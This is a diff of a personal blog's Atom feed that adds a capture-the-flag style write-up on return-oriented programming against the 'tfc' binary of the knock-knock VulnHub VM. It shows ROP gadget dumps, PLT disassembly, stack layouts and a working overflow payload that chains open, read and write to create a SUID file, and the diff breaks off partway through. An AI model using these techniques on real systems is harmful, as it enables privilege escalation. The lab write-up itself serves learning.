@@ -1,10 +1,10 @@
 <?xml version="1.0" encoding="utf-8"?>
 <feed xmlns="http://www.w3.org/2005/Atom">
 
-  <title><![CDATA[Category: Vm, | staring into /dev/null]]></title>
+  <title><![CDATA[Category: Vm | staring into /dev/null]]></title>
   <link href="http://barrebas.github.io/blog/categories/vm/atom.xml" rel="self"/>
   <link href="http://barrebas.github.io/"/>
-  <updated>2014-12-11T19:45:20+01:00</updated>
+  <updated>2014-12-24T12:12:27+01:00</updated>
   <id>http://barrebas.github.io/</id>
   <author>
     <name><![CDATA[barrebas]]></name>
@@ -1047,6 +1047,976 @@ http://wi-fu.co.uk, #VulnHub IRC or Twitter.
 </code></pre>
 
 <p>Yes! Done! I enjoyed this VM very much. Many many thanks to <a href="https://twitter.com/_RastaMouse">Rasta Mouse</a> for this awesome VM and of course <a href="http://vulnhub.com">g0tmi1k</a> for hostin it!</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Rop-rop for Knock-knock]]></title>
+    <link href="http://barrebas.github.io/blog/2014/10/16/rop-rop-for-knock-knock/"/>
+    <updated>2014-10-16T19:37:39+02:00</updated>
+    <id>http://barrebas.github.io/blog/2014/10/16/rop-rop-for-knock-knock</id>
+    <content type="html"><![CDATA[<p>I couldn&rsquo;t resist to make a ROP exploit for <code>tfc</code>, the last binary to root <a href="http://vulnhub.com/entry/knock-knock-11,105/">knock-knock</a>.</p>
+
+<!--more-->
+
+
+<p>I really like return-oriented-programming and I love to practice it! After seeing the awesome writeups for knock-knock by <a href="https://leonjza.github.io/blog/2014/10/14/knock-knock-whos-there-solving-knock-knock/">leonjza</a>, <a href="https://blog.techorganic.com/2014/10/15/knock-knock-hacking-challenge/">superkojiman</a> and <a href="https://knapsy.github.io/blog/2014/10/16/knock-knock-vm-walkthrough/">knapsy</a>, I was itching to see if I could pull a ROP exploit off. I knew about the buffer overflow, but what would I need to re-use code present in the binary? There are many &lsquo;types&rsquo; of ROP, such as <code>ret2libc</code> and chaining of so-called ROP gadgets. I first checked if there were enough gadgets to pull something off, like spawning a shell. <code>radare2</code> now has a nice feature where you can search for ROP gadgets with <code>/R</code>. Furthermore, <code>gdb-peda</code> has an awesome ROP gadget search function. Lastly, I <a href="https://gist.github.com/barrebas/4fc86eaf0e9b124813a3">built a custom ROP gadget dumper</a>. Not the most elegant solution, but it gives me a file I can <code>cat</code> and <code>grep</code>. Unfortunately, the amount of gadgets was only 107 and they weren&rsquo;t really useful, either. Back to the drawing board!</p>
+
+<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">&lt;/p&gt;
+
+&lt;h1&gt;sample output of ropgadgets.py&lt;/h1&gt;
+
+&lt;p&gt;RET: 0x8048921: add cl, cl<span class="p">;</span> ret<span class="p">;</span>
+RET: 0x804891f: add <span class="o">[</span>eax<span class="o">]</span>, al<span class="p">;</span> add cl, cl<span class="p">;</span> ret<span class="p">;</span>
+CALL_REG: 0x8048917: and al, 0xe8<span class="p">;</span> call ebx<span class="p">;</span>
+CALL_REG: 0x8048911: dec dword <span class="o">[</span>ebx+0x489f045<span class="o">]</span><span class="p">;</span> and al, 0xe8<span class="p">;</span> call ebx<span class="p">;</span>
+JMP_REG: 0x8048753: and al, 0xe8<span class="p">;</span> jmp edi<span class="p">;</span>
+JMP_REG: 0x804874d: fisttp dword <span class="o">[</span>edx+0x4890804<span class="o">]</span><span class="p">;</span> and al, 0xe8<span class="p">;</span> jmp edi<span class="p">;</span>
+JMP_REG: 0x804874b: and al, 0x4<span class="p">;</span> fisttp dword <span class="o">[</span>edx+0x4890804<span class="o">]</span><span class="p">;</span> and al, 0xe8<span class="p">;</span> jmp edi<span class="p">;</span>
+JMP_REG: 0x804874a: inc esp<span class="p">;</span> and al, 0x4<span class="p">;</span> fisttp dword <span class="o">[</span>edx+0x4890804<span class="o">]</span><span class="p">;</span> and al, 0xe8<span class="p">;</span> jmp edi<span class="p">;</span>
+JMP_REG: 0x8048748: add edi, eax<span class="p">;</span> inc esp<span class="p">;</span> and al, 0x4<span class="p">;</span> fisttp dword <span class="o">[</span>edx+0x4890804<span class="o">]</span><span class="p">;</span> and al, 0xe8<span class="p">;</span> jmp edi<span class="p">;</span>
+JMP_REG: 0x8048747: rol byte <span class="o">[</span>ecx<span class="o">]</span>, 0xc7<span class="p">;</span> inc esp<span class="p">;</span> and al, 0x4<span class="p">;</span> fisttp dword <span class="o">[</span>edx+0x4890804<span class="o">]</span><span class="p">;</span> and al, 0xe8<span class="p">;</span> jmp edi<span class="p">;</span>
+RET: 0x80486e3: add cl, cl<span class="p">;</span> ret<span class="p">;</span>
+RET: 0x80486e1: add <span class="o">[</span>eax<span class="o">]</span>, al<span class="p">;</span> add cl, cl<span class="p">;</span> ret<span class="p">;</span>
+RET: 0x8048615: dec ecx<span class="p">;</span> ret<span class="p">;</span>&lt;/p&gt;
+
+&lt;p&gt;</code></pre></div></p>
+
+<p>There are more ways to go about this problem. We want to do something that will lead to a root shell, without actually executing shellcode on the stack. But without enough gadgets, we&rsquo;re left with not much else. But wait! We still have access to the functions that the binary uses.</p>
+
+<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~/tmp/knockknock<span class="nv">$ </span>objdump -d tfc <span class="p">|</span>grep <span class="p">&amp;</span>ldquo<span class="p">;</span>.plt<span class="p">&amp;</span>rdquo<span class="p">;</span>
+Disassembly of section .plt:&lt;/p&gt;
+
+&lt;p&gt;08048430 <span class="p">&amp;</span>lt<span class="p">;</span>strcmp@plt-0x10&gt;:
+ 8048430:   ff <span class="m">35</span> 4c 9d <span class="m">04</span> <span class="m">08</span>       pushl  0x8049d4c
+ 8048436:   ff <span class="m">25</span> <span class="m">50</span> 9d <span class="m">04</span> <span class="m">08</span>       jmp    *0x8049d50
+ 804843c:   <span class="m">00</span> <span class="m">00</span>                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
+    <span class="p">&amp;</span>hellip<span class="p">;</span>&lt;/p&gt;
+
+&lt;p&gt;08048440 <span class="p">&amp;</span>lt<span class="p">;</span>strcmp@plt&gt;:
+ 8048440:   ff <span class="m">25</span> <span class="m">54</span> 9d <span class="m">04</span> <span class="m">08</span>       jmp    *0x8049d54
+ 8048446:   <span class="m">68</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>          push   <span class="nv">$0x0</span>
+ 804844b:   e9 e0 ff ff ff          jmp    <span class="m">8048430</span> <span class="p">&amp;</span>lt<span class="p">;</span>_init+0x2c&gt;&lt;/p&gt;
+
+&lt;p&gt;08048450 <span class="p">&amp;</span>lt<span class="p">;</span><span class="nb">read</span>@plt&gt;:
+ 8048450:   ff <span class="m">25</span> <span class="m">58</span> 9d <span class="m">04</span> <span class="m">08</span>       jmp    *0x8049d58
+ 8048456:   <span class="m">68</span> <span class="m">08</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>          push   <span class="nv">$0x8</span>
+ 804845b:   e9 d0 ff ff ff          jmp    <span class="m">8048430</span> <span class="p">&amp;</span>lt<span class="p">;</span>_init+0x2c&gt;&lt;/p&gt;
+
+&lt;p&gt;08048460 <span class="p">&amp;</span>lt<span class="p">;</span><span class="nb">printf</span>@plt&gt;:
+ 8048460:   ff <span class="m">25</span> 5c 9d <span class="m">04</span> <span class="m">08</span>       jmp    *0x8049d5c
+ 8048466:   <span class="m">68</span> <span class="m">10</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>          push   <span class="nv">$0x10</span>
+ 804846b:   e9 c0 ff ff ff          jmp    <span class="m">8048430</span> <span class="p">&amp;</span>lt<span class="p">;</span>_init+0x2c&gt;&lt;/p&gt;
+
+&lt;p&gt;08048470 <span class="p">&amp;</span>lt<span class="p">;</span>&lt;em&gt;_xstat@plt&gt;:
+ 8048470:   ff <span class="m">25</span> <span class="m">60</span> 9d <span class="m">04</span> <span class="m">08</span>       jmp    *0x8049d60
+ 8048476:   <span class="m">68</span> <span class="m">18</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>          push   <span class="nv">$0x18</span>
+ 804847b:   e9 b0 ff ff ff          jmp    <span class="m">8048430</span> <span class="p">&amp;</span>lt<span class="p">;</span>&lt;/em&gt;init+0x2c&gt;&lt;/p&gt;
+
+&lt;p&gt;08048480 <span class="p">&amp;</span>lt<span class="p">;</span>puts@plt&gt;:
+ 8048480:   ff <span class="m">25</span> <span class="m">64</span> 9d <span class="m">04</span> <span class="m">08</span>       jmp    *0x8049d64
+ 8048486:   <span class="m">68</span> <span class="m">20</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>          push   <span class="nv">$0x20</span>
+ 804848b:   e9 a0 ff ff ff          jmp    <span class="m">8048430</span> <span class="p">&amp;</span>lt<span class="p">;</span>_init+0x2c&gt;&lt;/p&gt;
+
+&lt;p&gt;08048490 <span class="p">&amp;</span>lt<span class="p">;</span>&lt;strong&gt;gmon_start&lt;/strong&gt;@plt&gt;:
+ 8048490:   ff <span class="m">25</span> <span class="m">68</span> 9d <span class="m">04</span> <span class="m">08</span>       jmp    *0x8049d68
+ 8048496:   <span class="m">68</span> <span class="m">28</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>          push   <span class="nv">$0x28</span>
+ 804849b:   e9 <span class="m">90</span> ff ff ff          jmp    <span class="m">8048430</span> <span class="p">&amp;</span>lt<span class="p">;</span>_init+0x2c&gt;&lt;/p&gt;
+
+&lt;p&gt;080484a0 <span class="p">&amp;</span>lt<span class="p">;</span>open@plt&gt;:
+ 80484a0:   ff <span class="m">25</span> 6c 9d <span class="m">04</span> <span class="m">08</span>       jmp    *0x8049d6c
+ 80484a6:   <span class="m">68</span> <span class="m">30</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>          push   <span class="nv">$0x30</span>
+ 80484ab:   e9 <span class="m">80</span> ff ff ff          jmp    <span class="m">8048430</span> <span class="p">&amp;</span>lt<span class="p">;</span>_init+0x2c&gt;&lt;/p&gt;
+
+&lt;p&gt;080484b0 <span class="p">&amp;</span>lt<span class="p">;</span>&lt;em&gt;_libc_start_main@plt&gt;:
+ 80484b0:   ff <span class="m">25</span> <span class="m">70</span> 9d <span class="m">04</span> <span class="m">08</span>       jmp    *0x8049d70
+ 80484b6:   <span class="m">68</span> <span class="m">38</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>          push   <span class="nv">$0x38</span>
+ 80484bb:   e9 <span class="m">70</span> ff ff ff          jmp    <span class="m">8048430</span> <span class="p">&amp;</span>lt<span class="p">;</span>&lt;/em&gt;init+0x2c&gt;&lt;/p&gt;
+
+&lt;p&gt;080484c0 <span class="p">&amp;</span>lt<span class="p">;</span>write@plt&gt;:
+ 80484c0:   ff <span class="m">25</span> <span class="m">74</span> 9d <span class="m">04</span> <span class="m">08</span>       jmp    *0x8049d74
+ 80484c6:   <span class="m">68</span> <span class="m">40</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>          push   <span class="nv">$0x40</span>
+ 80484cb:   e9 <span class="m">60</span> ff ff ff          jmp    <span class="m">8048430</span> <span class="p">&amp;</span>lt<span class="p">;</span>_init+0x2c&gt;&lt;/p&gt;
+
+&lt;p&gt;080484d0 <span class="p">&amp;</span>lt<span class="p">;</span>strrchr@plt&gt;:
+ 80484d0:   ff <span class="m">25</span> <span class="m">78</span> 9d <span class="m">04</span> <span class="m">08</span>       jmp    *0x8049d78
+ 80484d6:   <span class="m">68</span> <span class="m">48</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>          push   <span class="nv">$0x48</span>
+ 80484db:   e9 <span class="m">50</span> ff ff ff          jmp    <span class="m">8048430</span> <span class="p">&amp;</span>lt<span class="p">;</span>_init+0x2c&gt;&lt;/p&gt;
+
+&lt;p&gt;080484e0 <span class="p">&amp;</span>lt<span class="p">;</span>&lt;em&gt;_lxstat@plt&gt;:
+ 80484e0:   ff <span class="m">25</span> 7c 9d <span class="m">04</span> <span class="m">08</span>       jmp    *0x8049d7c
+ 80484e6:   <span class="m">68</span> <span class="m">50</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>          push   <span class="nv">$0x50</span>
+ 80484eb:   e9 <span class="m">40</span> ff ff ff          jmp    <span class="m">8048430</span> <span class="p">&amp;</span>lt<span class="p">;</span>&lt;/em&gt;init+0x2c&gt;&lt;/p&gt;
+
+&lt;p&gt;080484f0 <span class="p">&amp;</span>lt<span class="p">;</span>close@plt&gt;:
+ 80484f0:   ff <span class="m">25</span> <span class="m">80</span> 9d <span class="m">04</span> <span class="m">08</span>       jmp    *0x8049d80
+ 80484f6:   <span class="m">68</span> <span class="m">58</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>          push   <span class="nv">$0x58</span>
+ 80484fb:   e9 <span class="m">30</span> ff ff ff          jmp    <span class="m">8048430</span> <span class="p">&amp;</span>lt<span class="p">;</span>_init+0x2c&gt;&lt;/p&gt;
+
+&lt;p&gt;</code></pre></div></p>
+
+<p>We can re-use <code>open</code>, <code>read</code> and <code>write</code> to basically read and write any file we want! I began to write a basic Proof of Concept ROP chain. This chain would simply write to a file descriptor that is already open. These file descriptors are incremented every time a file is opened and therefore guessable. This will help later on, when we open our own files. Without gadgets, it is hard to pass values from one function call to the next&hellip; Luckily, 0x0 through 0x2 are used for stdin, stdout and stderr, and any file that is opened after that gets 0x3. The next one gets 0x4, and so on. This means that <code>in.tfc</code> is 0x3 and <code>out.tfc</code> is 0x4.</p>
+
+<p>I searched for the address of <code>write@plt</code> which turned out to be <code>0x80484c0</code>. I leveraged my buffer overflow from before to take control of code execution. We supply a large input of at least 4124 bytes. The buffer overflows, the return address on the stack is overwritten with the address of <code>write</code>. When the <code>ret</code> statement executes, we take control of code execution. Because the address points to <code>write</code>, this function will be executed using values conveniently placed on the stack. So at the point of gaining control of <code>eip</code>:</p>
+
+<p><div class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">esp</span><span class="o">-</span><span class="mo">04</span><span class="o">:</span> <span class="n">AAAA</span>
+<span class="n">esp</span><span class="o">&amp;</span><span class="n">ndash</span><span class="p">;</span><span class="o">&gt;:</span> <span class="mh">0x80484c0</span>   <span class="err">#</span> <span class="k">return</span> <span class="n">to</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">write</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span>
+<span class="n">esp</span><span class="o">+</span><span class="mo">04</span><span class="o">:</span> <span class="n">FAKE</span>        <span class="err">#</span> <span class="n">fake</span> <span class="k">return</span> <span class="n">address</span> <span class="k">for</span> <span class="n">when</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">write</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="n">complets</span>
+<span class="n">esp</span><span class="o">+</span><span class="mi">08</span><span class="o">:</span> <span class="mh">0x4</span>         <span class="err">#</span> <span class="n">this</span> <span class="n">is</span> <span class="n">the</span> <span class="n">file</span> <span class="n">descriptor</span> <span class="k">for</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">out</span><span class="p">.</span><span class="n">tfc</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span>
+<span class="n">esp</span><span class="o">+</span><span class="mi">0</span><span class="nl">c</span><span class="p">:</span> <span class="mh">0x80488b0</span>   <span class="err">#</span> <span class="n">random</span> <span class="n">value</span> <span class="k">for</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">contains</span> <span class="n">the</span> <span class="n">bytes</span> <span class="mi">8</span><span class="n">b</span> <span class="mi">45</span> <span class="n">ec</span>
+<span class="n">esp</span><span class="o">+</span><span class="mi">10</span><span class="o">:</span> <span class="mh">0x3</span>         <span class="err">#</span> <span class="n">length</span> <span class="n">of</span> <span class="n">buffer</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span></code></pre></div></p>
+
+<p>I ran this through the encryption Python script and fed the output to <code>tfc</code>:</p>
+
+<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">python -c <span class="p">&amp;</span>lsquo<span class="p">;</span>print <span class="p">&amp;</span>ldquo<span class="p">;</span>A<span class="p">&amp;</span>rdquo<span class="p">;</span>*4124 + <span class="p">&amp;</span>ldquo<span class="p">;</span><span class="se">\x</span>c0<span class="se">\x</span>84<span class="se">\x</span>04<span class="se">\x</span>08AAAA<span class="se">\x</span>04<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>b0<span class="se">\x</span>88<span class="se">\x</span>04<span class="se">\x</span>08<span class="se">\x</span>03<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="p">&amp;</span>rdquo<span class="p">;&amp;</span>rsquo<span class="p">;</span> &gt; in.tfc <span class="p">&amp;</span>amp<span class="p">;&amp;</span>amp<span class="p">;</span> python ./enc.py
+bas@tritonal:~/tmp/knockknock<span class="nv">$ </span>./tfc out2.tfc test5.tfc
+Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
+bas@tritonal:~/tmp/knockknock<span class="nv">$ </span>xxd test5.tfc
+0000000: 8b45 ec&lt;/p&gt;
+
+&lt;p&gt;</code></pre></div></p>
+
+<p>Success! The three bytes from the buffer are written into <code>test5.tfc</code>. This isn&rsquo;t very useful yet, so I decided to create my own file first. This way, we can specify permissions, such as having the SUID bit set! The plan, in very ugly pseudo-code, is:</p>
+
+<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">&lt;/p&gt;
+
+&lt;p&gt;file1 <span class="o">=</span> open<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>file1<span class="p">&amp;</span>rsquo<span class="p">;</span>, <span class="p">&amp;</span>lsquo<span class="p">;</span>w<span class="p">&amp;</span>rsquo<span class="p">;</span>, 04777<span class="o">)</span>
+<span class="nv">file2</span> <span class="o">=</span> open<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>file2<span class="p">&amp;</span>rsquo<span class="p">;</span>, <span class="p">&amp;</span>lsquo<span class="p">;</span>r<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span>
+<span class="nb">read</span><span class="o">(</span>file2, <span class="p">&amp;</span>amp<span class="p">;</span>buf, sizeof<span class="o">(</span>file2<span class="o">))</span>
+write<span class="o">(</span>file1, <span class="p">&amp;</span>amp<span class="p">;</span>buf, sizeof<span class="o">(</span>file1<span class="o">))</span>&lt;/p&gt;
+
+&lt;p&gt;</code></pre></div></p>
+
+<p>I&rsquo;ll go step by step. First, let&rsquo;s open our own file. The functions <a href="http://linux.die.net/man/2/open">open</a> and <a href="http://linux.die.net/man/2/write">write</a> look like this:</p>
+
+<p><div class="highlight"><pre><code class="language-c" data-lang="c"><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">open</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="n">pathname</span><span class="p">,</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">,</span> <span class="kt">mode_t</span> <span class="n">mode</span><span class="p">);</span>
+<span class="kt">ssize_t</span> <span class="nf">write</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">count</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span></code></pre></div></p>
+
+<p>There are several challenges here. First, we cannot specify our own filename, because we cannot pass strings to the program and know where they&rsquo;ll end up on the stack. Second, we can&rsquo;t pass the filehandle around. Third, I have no clue how <code>flags</code> and <code>mode</code> work, in binary. Fourth, we need some way to clean up the stack so we can chain these libc calls together.</p>
+
+<p>Overcoming the first challenge is easy. <code>tfc</code> contains several strings which we can re-use. I chose &lsquo;read&rsquo; as I though it was fitting. It&rsquo;s located at <code>0x8049315</code>. For the output file, I already looked up the location of &lsquo;write&rsquo; at <code>0x804933e</code>. I then proceeded to make a small binary, to get the values for <code>flags</code> and <code>mode</code>:</p>
+
+<p><div class="highlight"><pre><code class="language-c" data-lang="c"><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">sys</span><span class="o">/</span><span class="n">types</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">sys</span><span class="o">/</span><span class="n">stat</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">fcntl</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;*</span><span class="n">argv</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">FILE</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="n">f</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">test</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">O_WRONLY</span><span class="o">|</span><span class="n">O_APPEND</span><span class="o">|</span><span class="n">O_CREAT</span><span class="p">,</span> <span class="mo">04755</span><span class="p">);</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span></code></pre></div></p>
+
+<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">&lt;/p&gt;
+
+&lt;h2&gt;bas@tritonal:~/tmp/knockknock<span class="nv">$ </span>objdump -d a.out <span class="p">|</span>grep open -B4&lt;/h2&gt;
+
+&lt;p&gt;  400579:   ba ed <span class="m">09</span> <span class="m">00</span> <span class="m">00</span>          mov    <span class="nv">$0x9ed</span>,%edx
+  40057e:   be <span class="m">41</span> <span class="m">04</span> <span class="m">00</span> <span class="m">00</span>          mov    <span class="nv">$0x441</span>,%esi
+  400583:   bf <span class="m">34</span> <span class="m">06</span> <span class="m">40</span> <span class="m">00</span>          mov    <span class="nv">$0x400634</span>,%edi
+  400588:   b8 <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>          mov    <span class="nv">$0x0</span>,%eax
+  40058d:   e8 ce fe ff ff          callq  <span class="m">400460</span> <span class="p">&amp;</span>lt<span class="p">;</span>open@plt&gt;&lt;/p&gt;
+
+&lt;p&gt;</code></pre></div></p>
+
+<p>Finally, cleaning up the stack is necessary. After the first call to open, the stack would look like this:</p>
+
+<p><div class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">esp</span><span class="o">-</span><span class="mo">04</span><span class="o">:</span> <span class="mh">0x80484c0</span>   <span class="err">#</span> <span class="k">return</span> <span class="n">to</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">write</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span>
+<span class="n">esp</span><span class="o">&amp;</span><span class="n">ndash</span><span class="p">;</span><span class="o">&gt;:</span> <span class="n">next_func</span>   <span class="err">#</span> <span class="n">next</span> <span class="n">function</span> <span class="n">address</span>
+<span class="n">esp</span><span class="o">+</span><span class="mo">04</span><span class="o">:</span> <span class="mh">0x4</span>         <span class="err">#</span> <span class="n">this</span> <span class="n">is</span> <span class="n">the</span> <span class="n">file</span> <span class="n">descriptor</span> <span class="k">for</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">out</span><span class="p">.</span><span class="n">tfc</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span>
+<span class="n">esp</span><span class="o">+</span><span class="mi">08</span><span class="o">:</span> <span class="mh">0x80488b0</span>   <span class="err">#</span> <span class="n">random</span> <span class="n">value</span> <span class="k">for</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">contains</span> <span class="n">the</span> <span class="n">bytes</span> <span class="mi">8</span><span class="n">b</span> <span class="mi">45</span> <span class="n">ec</span>
+<span class="n">esp</span><span class="o">+</span><span class="mi">0</span><span class="nl">c</span><span class="p">:</span> <span class="mh">0x3</span>         <span class="err">#</span> <span class="n">length</span> <span class="n">of</span> <span class="n">buffer</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">return</span> <span class="n">to</span> <span class="nl">next_func</span><span class="p">:</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">esp</span><span class="o">-</span><span class="mi">08</span><span class="o">:</span> <span class="mh">0x80484c0</span>   <span class="err">#</span> <span class="k">return</span> <span class="n">to</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">write</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span>
+<span class="n">esp</span><span class="o">-</span><span class="mo">04</span><span class="o">:</span> <span class="n">next_func</span>   <span class="err">#</span> <span class="n">next</span> <span class="n">function</span> <span class="n">address</span>
+<span class="n">esp</span><span class="o">&amp;</span><span class="n">ndash</span><span class="p">;</span><span class="o">&gt;:</span> <span class="mh">0x4</span>         <span class="err">#</span> <span class="n">this</span> <span class="n">is</span> <span class="n">the</span> <span class="n">file</span> <span class="n">descriptor</span> <span class="k">for</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">out</span><span class="p">.</span><span class="n">tfc</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span>
+<span class="n">esp</span><span class="o">+</span><span class="mo">04</span><span class="o">:</span> <span class="mh">0x80488b0</span>   <span class="err">#</span> <span class="n">random</span> <span class="n">value</span> <span class="k">for</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">contains</span> <span class="n">the</span> <span class="n">bytes</span> <span class="mi">8</span><span class="n">b</span> <span class="mi">45</span> <span class="n">ec</span>
+<span class="n">esp</span><span class="o">+</span><span class="mi">08</span><span class="o">:</span> <span class="mh">0x3</span>         <span class="err">#</span> <span class="n">length</span> <span class="n">of</span> <span class="n">buffer</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span></code></pre></div></p>
+
+<p>But next_func requires completely different arguments! We need to align the stack pointer after returning from &lsquo;write&rsquo;. This can be removing a few values from the stack before return to next_func.</p>
+
+<p>This removal of values can be using a primitive called <code>pop pop pop ret</code>. The return address for the libc calls is a place in the binary that contains three pop instructions, which pop three values from the stack, and then return to whatever value is on the stack. This allows code execution to continue smoothly, otherwise it might choke on one of the values that we pass to a libc function. I used my ropgadget script to find it at <code>0x80489d6</code>; there are many more, and many other ways to find them. The basic ROP chain element now looks like this:</p>
+
+<p><div class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">esp</span><span class="o">&amp;</span><span class="n">ndash</span><span class="p">;</span><span class="o">&gt;:</span> <span class="n">ADDR</span>        <span class="err">#</span> <span class="k">return</span> <span class="n">to</span> <span class="n">function</span> <span class="n">at</span> <span class="n">ADDR</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">esp</span><span class="o">+</span><span class="mo">04</span><span class="o">:</span> <span class="n">PPPR</span>        <span class="err">#</span> <span class="n">pop</span> <span class="n">pop</span> <span class="n">pop</span> <span class="n">ret</span> <span class="n">primitive</span><span class="p">,</span> <span class="n">to</span> <span class="n">remove</span> <span class="n">values</span> <span class="n">from</span> <span class="n">the</span> <span class="n">stack</span><span class="p">.</span>
+                    <span class="cp"># this pppr primitive must have enough POPs to remove N arguments from the stack!&lt;/p&gt;</span>
+
